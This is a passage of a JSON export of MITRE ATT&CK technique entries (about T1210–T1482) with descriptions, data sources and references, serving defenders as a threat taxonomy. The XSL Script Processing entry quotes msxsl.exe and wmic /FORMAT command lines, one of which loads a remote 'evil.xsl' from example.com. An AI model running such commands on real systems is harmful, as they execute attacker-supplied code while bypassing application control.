    "technique_description": "<p>Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.<!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary may need to determine if the remote system is in a vulnerable state, which may be done through <a href=\"https://attack.mitre.org/techniques/T1046\">Network Service Scanning</a> or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.<!-- raw HTML omitted --><!-- raw HTML omitted -->There are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services. (Citation: NVD CVE-2014-7169)<!-- raw HTML omitted --><!-- raw HTML omitted -->Depending on the permissions level of the vulnerable remote service an adversary may achieve <a href=\"https://attack.mitre.org/techniques/T1068\">Exploitation for Privilege Escalation</a> as a result of lateral movement exploitation as well.</p>\n",
    "technique_references": [
      {
        "source_name": "CIS Multiple SMB Vulnerabilities",
        "url": "https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-microsoft-windows-smb-server-could-allow-for-remote-code-execution/",
        "description": "CIS. (2017, May 15). Multiple Vulnerabilities in Microsoft Windows SMB Server Could Allow for Remote Code Execution. Retrieved April 3, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "NVD CVE-2017-0176",
        "url": "https://nvd.nist.gov/vuln/detail/CVE-2017-0176",
        "description": "National Vulnerability Database. (2017, June 22). CVE-2017-0176 Detail. Retrieved April 3, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "NVD CVE-2016-6662",
        "url": "https://nvd.nist.gov/vuln/detail/CVE-2016-6662",
        "description": "National Vulnerability Database. (2017, February 2). CVE-2016-6662 Detail. Retrieved April 3, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "NVD CVE-2014-7169",
        "url": "https://nvd.nist.gov/vuln/detail/CVE-2014-7169",
        "description": "National Vulnerability Database. (2017, September 24). CVE-2014-7169 Detail. Retrieved April 3, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--fe926152-f431-4baf-956c-4ad3cb0bf23b",
    "platform": "linux|windows|macos",
    "tid": "T1211",
    "technique": "Exploitation for Defense Evasion",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring|process-monitoring|windows-error-reporting",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for <a href=\"https://attack.mitre.org/techniques/T1518/001\">Security Software Discovery</a>. The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--9c306d8d-cde7-4b4c-b6e8-d0bb16caca36",
    "platform": "linux|windows|macos",
    "tid": "T1212",
    "technique": "Exploitation for Credential Access",
    "tactic": "credential-access",
    "datasources": "authentication-logs|process-monitoring|windows-error-reporting",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Credentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain access to systems. One example of this is MS14-068, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Exploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.</p>\n",
    "technique_references": [
      {
        "source_name": "Technet MS14-068",
        "url": "https://technet.microsoft.com/en-us/library/security/ms14-068.aspx",
        "description": "Microsoft. (2014, November 18). Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780). Retrieved December 23, 2015.",
        "external_id": "none"
      },
      {
        "source_name": "ADSecurity Detecting Forged Tickets",
        "url": "https://adsecurity.org/?p=1515",
        "description": "Metcalf, S. (2015, May 03). Detecting Forged Kerberos Ticket (Golden Ticket & Silver Ticket) Use in Active Directory. Retrieved December 23, 2015.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--d28ef391-8ed4-45dc-bc4a-2f43abf54416",
    "platform": "linux|windows|macos|saas|office-365",
    "tid": "T1213",
    "technique": "Data from Information Repositories",
    "tactic": "collection",
    "datasources": "application-logs|authentication-logs|data-loss-prevention|oauth-audit-logs|third-party-application-logs",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1213.001",
      "T1213.002"
    ],
    "count_subtechniques": 2,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information.<!-- raw HTML omitted --><!-- raw HTML omitted -->The following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:<!-- raw HTML omitted --><!-- raw HTML omitted -->* Policies, procedures, and standards<!-- raw HTML omitted -->* Physical / logical network diagrams<!-- raw HTML omitted -->* System architecture diagrams<!-- raw HTML omitted -->* Technical system documentation<!-- raw HTML omitted -->* Testing / development credentials<!-- raw HTML omitted -->* Work / project schedules<!-- raw HTML omitted -->* Source code snippets<!-- raw HTML omitted -->* Links to network shares and other internal resources<!-- raw HTML omitted --><!-- raw HTML omitted -->Information stored in a repository may vary based on the specific instance or environment. Specific common information repositories include <a href=\"https://attack.mitre.org/techniques/T1213/002\">Sharepoint</a>, <a href=\"https://attack.mitre.org/techniques/T1213/001\">Confluence</a>, and enterprise databases such as SQL Server.</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft SharePoint Logging",
        "url": "https://support.office.com/en-us/article/configure-audit-settings-for-a-site-collection-a9920c97-38c0-44f2-8bcb-4cf1e2ae22d2",
        "description": "Microsoft. (2017, July 19). Configure audit settings for a site collection. Retrieved April 4, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Atlassian Confluence Logging",
        "url": "https://confluence.atlassian.com/confkb/how-to-enable-user-access-logging-182943.html",
        "description": "Atlassian. (2018, January 9). How to Enable User Access Logging. Retrieved April 4, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--f6fe9070-7a65-49ea-ae72-76292f42cebe",
    "platform": "windows",
    "tid": "T1216",
    "technique": "Signed Script Proxy Execution",
    "tactic": "defense-evasion",
    "datasources": "process-command-line-parameters|process-monitoring",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1216.001"
    ],
    "count_subtechniques": 1,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use scripts signed with trusted certificates to proxy execution of malicious files. Several Microsoft signed scripts that are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.(Citation: GitHub Ultimate AppLocker Bypass List)</p>\n",
    "technique_references": [
      {
        "source_name": "GitHub Ultimate AppLocker Bypass List",
        "url": "https://github.com/api0cradle/UltimateAppLockerByPassList",
        "description": "Moe, O. (2018, March 1). Ultimate AppLocker Bypass List. Retrieved April 10, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--5e4a2073-9643-44cb-a0b5-e7f4048446c7",
    "platform": "linux|windows|macos",
    "tid": "T1217",
    "technique": "Browser Bookmark Discovery",
    "tactic": "discovery",
    "datasources": "api-monitoring|file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may enumerate browser bookmarks to learn more about compromised hosts. Browser bookmarks may reveal personal information about users (ex: banking sites, interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure.<!-- raw HTML omitted --><!-- raw HTML omitted -->Browser bookmarks may also highlight additional targets after an adversary has access to valid credentials, especially <a href=\"https://attack.mitre.org/techniques/T1552/001\">Credentials In Files</a> associated with logins cached by a browser.<!-- raw HTML omitted --><!-- raw HTML omitted -->Specific storage locations vary based on platform and/or application, but browser bookmarks are typically stored in local files/databases.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--457c7820-d331-465a-915e-42f85500ccc4",
    "platform": "windows",
    "tid": "T1218",
    "technique": "Signed Binary Proxy Execution",
    "tactic": "defense-evasion",
    "datasources": "api-monitoring|binary-file-metadata|dll-monitoring|file-monitoring|loaded-dlls|process-command-line-parameters|process-monitoring|process-use-of-network|windows-registry",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1218.001",
      "T1218.002",
      "T1218.003",
      "T1218.004",
      "T1218.005",
      "T1218.007",
      "T1218.008",
      "T1218.009",
      "T1218.010",
      "T1218.011",
      "T1218.012"
    ],
    "count_subtechniques": 11,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--4061e78c-1284-44b4-9116-73e4ac3912f7",
    "platform": "linux|windows|macos",
    "tid": "T1219",
    "technique": "Remote Access Software",
    "tactic": "command-and-control",
    "datasources": "network-intrusion-detection-system|network-protocol-analysis|process-monitoring|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)<!-- raw HTML omitted --><!-- raw HTML omitted -->Remote access tools may be established and used post-compromise as alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary controlled system.<!-- raw HTML omitted --><!-- raw HTML omitted -->Admin tools such as TeamViewer have been used by several groups targeting institutions in countries of interest to the Russian state and criminal campaigns. (Citation: CrowdStrike 2015 Global Threat Report) (Citation: CrySyS Blog TeamSpy)</p>\n",
    "technique_references": [
      {
        "source_name": "Symantec Living off the Land",
        "url": "https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/istr-living-off-the-land-and-fileless-attack-techniques-en.pdf",
        "description": "Wueest, C., Anand, H. (2017, July). Living off the land and fileless attack techniques. Retrieved April 10, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "CrowdStrike 2015 Global Threat Report",
        "url": "https://go.crowdstrike.com/rs/281-OBQ-266/images/15GlobalThreatReport.pdf",
        "description": "CrowdStrike Intelligence. (2016). 2015 Global Threat Report. Retrieved April 11, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "CrySyS Blog TeamSpy",
        "url": "https://blog.crysys.hu/2013/03/teamspy/",
        "description": "CrySyS Lab. (2013, March 20). TeamSpy – Obshie manevri. Ispolzovat’ tolko s razreshenija S-a. Retrieved April 11, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--ebbe170d-aa74-4946-8511-9921243415a3",
    "platform": "windows",
    "tid": "T1220",
    "technique": "XSL Script Processing",
    "tactic": "defense-evasion",
    "datasources": "dll-monitoring|process-command-line-parameters|process-monitoring|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to <a href=\"https://attack.mitre.org/techniques/T1127\">Trusted Developer Utilities Proxy Execution</a>, the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.(Citation: XSL Bypass Mar 2019)<!-- raw HTML omitted --><!-- raw HTML omitted -->Command-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass Mar 2019)<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->msxsl.exe customers[.]xml script[.]xsl<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->msxsl.exe script[.]xsl script[.]xsl<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->msxsl.exe script[.]jpeg script[.]jpeg<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->Another variation of this technique, dubbed “Squiblytwo”, involves using <a href=\"https://attack.mitre.org/techniques/T1047\">Windows Management Instrumentation</a> to invoke JScript or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can also execute local/remote scripts and, similar to its <a href=\"https://attack.mitre.org/techniques/T1117\">Regsvr32</a>/ “Squiblydoo” counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in <a href=\"https://attack.mitre.org/techniques/T1047\">Windows Management Instrumentation</a> provided they utilize the /FORMAT switch.(Citation: XSL Bypass Mar 2019)<!-- raw HTML omitted --><!-- raw HTML omitted -->Command-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)<!-- raw HTML omitted --><!-- raw HTML omitted -->* Local File: <!-- raw HTML omitted -->wmic process list /FORMAT:evil[.]xsl<!-- raw HTML omitted --><!-- raw HTML omitted -->* Remote File: <!-- raw HTML omitted -->wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”<!-- raw HTML omitted --></p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft XSLT Script Mar 2017",
        "url": "https://docs.microsoft.com/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script",
        "description": "Wenzel, M. et al. (2017, March 30). XSLT Stylesheet Scripting Using <msxsl:script>. Retrieved July 3, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft msxsl.exe",
        "url": "https://www.microsoft.com/download/details.aspx?id=21714",
        "description": "Microsoft. (n.d.). Command Line Transformation Utility (msxsl.exe). Retrieved July 3, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Penetration Testing Lab MSXSL July 2017",
        "url": "https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/",
        "description": "netbiosX. (2017, July 6). AppLocker Bypass – MSXSL. Retrieved July 3, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Reaqta MSXSL Spearphishing MAR 2018",
        "url": "https://reaqta.com/2018/03/spear-phishing-campaign-leveraging-msxsl/",
        "description": "Admin. (2018, March 2). Spear-phishing campaign leveraging on MSXSL. Retrieved July 3, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "XSL Bypass Mar 2019",
        "url": "https://medium.com/@threathuntingteam/msxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75",
        "description": "Singh, A. (2019, March 14). MSXSL.EXE and WMIC.EXE — A Way to Proxy Code Execution. Retrieved August 2, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "LOLBAS Wmic",
        "url": "https://lolbas-project.github.io/lolbas/Binaries/Wmic/",
        "description": "LOLBAS. (n.d.). Wmic.exe. Retrieved July 31, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Twitter SquiblyTwo Detection APR 2018",
        "url": "https://twitter.com/dez_/status/986614411711442944",
        "description": "Desimone, J. (2018, April 18). Status Update. Retrieved July 3, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--dc31fe1e-d722-49da-8f5f-92c7b5aff534",
    "platform": "windows",
    "tid": "T1221",
    "technique": "Template Injection",
    "tactic": "defense-evasion",
    "datasources": "anti-virus|email-gateway|network-intrusion-detection-system|web-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may create or modify references in Office document templates to conceal malicious code or force authentication attempts. Microsoft’s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered. (Citation: Microsoft Open XML July 2017)<!-- raw HTML omitted --><!-- raw HTML omitted -->Properties within parts may reference shared public resources accessed via online URLs. For example, template properties reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may abuse this technology to initially conceal malicious code to be executed via documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded. (Citation: SANS Brian Wiltse Template Injection) These documents can be delivered via other techniques such as <a href=\"https://attack.mitre.org/techniques/T1566\">Phishing</a> and/or <a href=\"https://attack.mitre.org/techniques/T1080\">Taint Shared Content</a> and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched. (Citation: Redxorblue Remote Template Injection) Examples have been seen in the wild where template injection was used to load malicious code containing an exploit. (Citation: MalwareBytes Template Injection OCT 2017)<!-- raw HTML omitted --><!-- raw HTML omitted -->This technique may also enable <a href=\"https://attack.mitre.org/techniques/T1187\">Forced Authentication</a> by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt. (Citation: Anomali Template Injection MAR 2018) (Citation: Talos Template Injection July 2017) (Citation: ryhanson phishery SEPT 2016)</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft Open XML July 2017",
        "url": "https://docs.microsoft.com/previous-versions/office/developer/office-2007/aa338205(v=office.12)",
        "description": "Microsoft. (2014, July 9). Introducing the Office (2007) Open XML File Formats. Retrieved July 20, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "SANS Brian Wiltse Template Injection",
        "url": "https://www.sans.org/reading-room/whitepapers/testing/template-injection-attacks-bypassing-security-controls-living-land-38780",
        "description": "Wiltse, B.. (2018, November 7). Template Injection Attacks - Bypassing Security Controls by Living off the Land. Retrieved April 10, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Redxorblue Remote Template Injection",
        "url": "http://blog.redxorblue.com/2018/07/executing-macros-from-docx-with-remote.html",
        "description": "Hawkins, J. (2018, July 18). Executing Macros From a DOCX With Remote Template Injection. Retrieved October 12, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "MalwareBytes Template Injection OCT 2017",
        "url": "https://blog.malwarebytes.com/threat-analysis/2017/10/decoy-microsoft-word-document-delivers-malware-through-rat/",
        "description": "Segura, J. (2017, October 13). Decoy Microsoft Word document delivers malware through a RAT. Retrieved July 21, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Anomali Template Injection MAR 2018",
        "url": "https://forum.anomali.com/t/credential-harvesting-and-malicious-file-delivery-using-microsoft-office-template-injection/2104",
        "description": "Intel_Acquisition_Team. (2018, March 1). Credential Harvesting and Malicious File Delivery using Microsoft Office Template Injection. Retrieved July 20, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Talos Template Injection July 2017",
        "url": "https://blog.talosintelligence.com/2017/07/template-injection.html",
        "description": "Baird, S. et al.. (2017, July 7). Attack on Critical Infrastructure Leverages Template Injection. Retrieved July 21, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "ryhanson phishery SEPT 2016",
        "url": "https://github.com/ryhanson/phishery",
        "description": "Hanson, R. (2016, September 24). phishery. Retrieved July 21, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--65917ae0-b854-4139-83fe-bf2441cf0196",
    "platform": "linux|windows|macos",
    "tid": "T1222",
    "technique": "File and Directory Permissions Modification",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring|windows-event-logs",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1222.001",
      "T1222.002"
    ],
    "count_subtechniques": 2,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).<!-- raw HTML omitted --><!-- raw HTML omitted -->Modifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory’s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via <a href=\"https://attack.mitre.org/techniques/T1546/008\">Accessibility Features</a>, <a href=\"https://attack.mitre.org/techniques/T1037\">Boot or Logon Initialization Scripts</a>, <a href=\"https://attack.mitre.org/techniques/T1546/004\">.bash_profile and .bashrc</a>, or tainting/hijacking other instrumental binary/configuration files via <a href=\"https://attack.mitre.org/techniques/T1574\">Hijack Execution Flow</a>.</p>\n",
    "technique_references": [
      {
        "source_name": "Hybrid Analysis Icacls1 June 2018",
        "url": "https://www.hybrid-analysis.com/sample/ef0d2628823e8e0a0de3b08b8eacaf41cf284c086a948bdfd67f4e4373c14e4d?environmentId=100",
        "description": "Hybrid Analysis. (2018, June 12). c9b65b764985dfd7a11d3faf599c56b8.exe. Retrieved August 19, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Hybrid Analysis Icacls2 May 2018",
        "url": "https://www.hybrid-analysis.com/sample/22dab012c3e20e3d9291bce14a2bfc448036d3b966c6e78167f4626f5f9e38d6?environmentId=110",
        "description": "Hybrid Analysis. (2018, May 30). 2a8efbfadd798f6111340f7c1c956bee.dll. Retrieved August 19, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "EventTracker File Permissions Feb 2014",
        "url": "https://www.eventtracker.com/tech-articles/monitoring-file-permission-changes-windows-security-log/",
        "description": "Netsurion. (2014, February 19). Monitoring File Permission Changes with the Windows Security Log. Retrieved August 19, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--853c4192-4311-43e1-bfbb-b11b14911852",
    "platform": "linux|macos|windows",
    "tid": "T1480",
    "technique": "Execution Guardrails",
    "tactic": "defense-evasion",
    "datasources": "process-monitoring",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1480.001"
    ],
    "count_subtechniques": 1,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign.(Citation: FireEye Kevin Mandia Guardrails) Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.(Citation: FireEye Outlook Dec 2019)<!-- raw HTML omitted --><!-- raw HTML omitted -->Guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical <a href=\"https://attack.mitre.org/techniques/T1497\">Virtualization/Sandbox Evasion</a>. While use of <a href=\"https://attack.mitre.org/techniques/T1497\">Virtualization/Sandbox Evasion</a> may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.</p>\n",
    "technique_references": [
      {
        "source_name": "FireEye Kevin Mandia Guardrails",
        "url": "https://www.cyberscoop.com/kevin-mandia-fireeye-u-s-malware-nice/",
        "description": "Shoorbajee, Z. (2018, June 1). Playing nice? FireEye CEO says U.S. malware is more restrained than adversaries'. Retrieved January 17, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye Outlook Dec 2019",
        "url": "https://www.fireeye.com/blog/threat-research/2019/12/breaking-the-rules-tough-outlook-for-home-page-attacks.html",
        "description": "McWhirt, M., Carr, N., Bienstock, D. (2019, December 4). Breaking the Rules: A Tough Outlook for Home Page Attacks (CVE-2017-11774). Retrieved June 23, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--767dbf9e-df3f-45cb-8998-4903ab5f80c0",
    "platform": "windows",
    "tid": "T1482",
    "technique": "Domain Trust Discovery",
    "tactic": "discovery",
    "datasources": "api-monitoring|powershell-logs|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.(Citation: Microsoft Trusts) Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct <a href=\"https://attack.mitre.org/techniques/T1134/005\">SID-History Injection</a>, <a href=\"https://attack.mitre.org/techniques/T1550/003\">Pass the Ticket</a>, and <a href=\"https://attack.mitre.org/techniques/T1558/003\">Kerberoasting</a>.(Citation: AdSecurity Forging Trust Tickets)(Citation: Harmj0y Domain Trusts) Domain trusts can be enumerated using the <code>DSEnumerateDomainTrusts()</code> Win32 API call, .NET methods, and LDAP.(Citation: Harmj0y Domain Trusts) The Windows utility <a href=\"https://attack.mitre.org/software/S0359\">Nltest</a> is known to be used by adversaries to enumerate domain trusts.(Citation: Microsoft Operation Wilysupply)</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft Trusts",
        "url": "https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc759554(v=ws.10)",
        "description": "Microsoft. (2009, October 7). Trust Technologies. Retrieved February 14, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "AdSecurity Forging Trust Tickets",
        "url": "https://adsecurity.org/?p=1588",
        "description": "Metcalf, S. (2015, July 15). It’s All About Trust – Forging Kerberos Trust Tickets to Spoof Access across Active Directory Trusts. Retrieved February 14, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Harmj0y Domain Trusts",
        "url": "http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/",
        "description": "Schroeder, W. (2017, October 30). A Guide to Attacking Domain Trusts. Retrieved February 14, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Operation Wilysupply",
        "url": "https://www.microsoft.com/security/blog/2017/05/04/windows-defender-atp-thwarts-operation-wilysupply-software-supply-chain-cyberattack/",
        "description": "Florio, E.. (2017, May 4). Windows Defender ATP thwarts Operation WilySupply software supply chain cyberattack. Retrieved February 14, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft GetAllTrustRelationships",
        "url": "https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectory.domain.getalltrustrelationships?redirectedfrom=MSDN&view=netframework-4.7.2#System_DirectoryServices_ActiveDirectory_Domain_GetAllTrustRelationships",
        "description": "Microsoft. (n.d.). Domain.GetAllTrustRelationships Method. Retrieved February 14, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--ebb42bbe-62d7-47d7-a55f-3b08b61d792d",
    "platform": "windows|azure-ad",
    "tid": "T1484",
